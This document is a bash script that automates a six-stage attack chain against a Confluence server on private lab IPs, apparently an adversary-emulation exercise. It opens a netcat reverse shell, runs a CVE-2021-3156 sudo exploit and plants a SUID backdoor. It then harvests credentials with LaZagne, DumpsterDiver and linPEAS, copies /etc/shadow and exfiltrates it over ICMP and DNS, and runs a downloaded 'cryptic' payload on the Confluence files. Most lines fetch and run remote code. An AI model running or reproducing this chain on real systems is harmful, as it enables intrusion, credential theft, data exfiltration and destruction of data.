#!/bin/bash

################# STAGE 1 #################

# Script for through_the_wire.py - Initial Access

LHOST=10.0.0.5
LHOSTPORT=4242
RHOST=10.0.0.3
RHOSTPORT=8090

python3 /tmp/1_InitialAccess/through_the_wire.py --lhost $LHOST --lport $LHOSTPORT --rhost $RHOST --rport $RHOSTPORT --reverse-shell --protocol http:// --nc-path /bin/netcat

################# STAGE 2 #################

# Download CVE-2021-3156 Exploit
whoami
mkdir /tmp/pe
cd /tmp/pe
git clone https://github.com/CptGibbon/CVE-2021-3156.git

# Build and Run Exploit
cd CVE-2021-3156
make
./exploit
whoami
id

################# STAGE 3 #################

### SUID PERSISTENCE ###
# Build Binary
mkdir /tmp/persistence
cd /tmp/persistence
curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/binarysuid.c > suid.c
gcc suid.c -o suid

# Run Exploit
chmod 7111 suid
whoami
./suid
whoami

################# STAGE 4 #################

#Credential Access Execution Script
#Download tools
/bin/bash -c 'curl -L http://github.com/securing/DumpsterDiver/archive/master.tar.gz | tar zxf - -C /tmp'
/bin/bash -c 'cd /tmp/DumpsterDiver-master; python3 -m venv env; source "env/bin/activate"; pip3 install -U pip; pip3 install wheel; pip3 install -r requirements.txt'
/bin/bash -c 'curl -L http://github.com/AlessandroZ/LaZagne/archive/master.tar.gz | tar zxf - -C /tmp'
/bin/bash -c 'cd /tmp/LaZagne-master; python3 -m venv env; source "env/bin/activate"; pip3 install -U pip; pip3 install wheel setuptools ; pip3 install -r requirements.txt'
/bin/bash -c 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh'
/bin/bash -c 'chmod +x /tmp/linpeas.sh'

#Create Exfiltration Folder
mkdir -m 777 /tmp/exfiltrate
mkdir -m 777 /tmp/exfiltrate/credentialAccess

#Dumpster Diver
/bin/bash -c 'cd /tmp/DumpsterDiver-master; source "env/bin/activate"; python3 DumpsterDiver.py -p / -s -o /tmp/exfiltrate/credentialAccess/DumpsterDiver-$HOSTNAME.$(date +%Y%m%d).json &'

#LaZagne
/bin/bash -c 'cd /tmp/LaZagne-master; source "env/bin/activate"; python3 Linux/laZagne.py all -v -oJ -output /tmp/exfiltrate/credentialAccess'
/bin/bash -c 'cd /tmp/exfiltrate/credentialAccess; mv credentials.json LaZagne-$HOSTNAME.$(date +%Y%m%d).json'

#linPEAS
sh /tmp/linpeas.sh -a -r >> /tmp/exfiltrate/credentialAccess/linPEAS-$HOSTNAME.$(date +%Y%m%d) 2>&1 &

################# STAGE 5 #################

# #[EXFILTRATION]
mkdir -m 777 /tmp/exfiltrate
#Simulate collected files
cat /etc/passwd > /tmp/exfiltrate/passwd
cat /etc/shadow > /tmp/exfiltrate/shadow
# Run qssender to exfilrate via ICMP
wget https://github.com/ariary/QueenSono/releases/latest/download/qssender -O /tmp/qssender
chmod +x /tmp/qssender
curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/run_qssender.sh > run_qssender.sh
chmod +x /tmp/run_qssender.sh
nohup /tmp/run_qssender.sh &>/dev/null &
# Run DNSteal to exfiltrate via DNS
curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/run_dnsteal.sh > run_dnssteal.sh
chmod +x /tmp/run_dnsteal.sh
nohup /tmp/run_dnsteal.sh &>/dev/null &

################# STAGE 6 #################

# Download payload
mkdir /tmp/cryptic
cd /tmp/cryptic
curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/003d4ecfcb9a0b468c02af72f495e90b6a2fd01e/cryptic > cryptic

# Attack phase (Find with name 'confluence' in /var and /opt)
chmod +x cryptic
./cryptic $(find /var -name "confluence" -print) $(find /opt -name "confluence" -print)


# Cleanup
cd /
rm -rf /tmp/pe
rm -rf /tmp/persistence
rm -rf /tmp/cryptic
rm /tmp/*